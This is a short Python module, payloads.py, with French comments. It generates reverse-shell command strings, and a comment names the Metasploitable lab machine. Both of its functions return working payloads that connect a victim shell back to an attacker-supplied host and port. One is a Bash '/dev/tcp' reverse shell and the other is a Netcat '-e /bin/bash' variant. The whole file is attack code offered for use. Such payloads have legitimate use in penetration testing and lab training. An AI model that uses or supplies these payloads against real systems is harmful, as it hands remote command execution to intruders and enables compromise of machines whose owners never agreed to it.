"""
payloads.py – génération de shells inverses fiables
"""
def bash_tcp_reverse(lhost: str, lport: int) -> str:
    """
    Reverse shell pur Bash.
    On invoque explicitement /bin/bash -c depuis /bin/sh (dash) pour éviter
    les problèmes de redirections non prises en charge.
    """
    return (
        f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )

def nc_reverse_shell(lhost: str, lport: int) -> str:
    """
    Variante Netcat (nc-traditional) – Metasploitable en dispose avec -e.
    """
    return f"nc -e /bin/bash {lhost} {lport}"
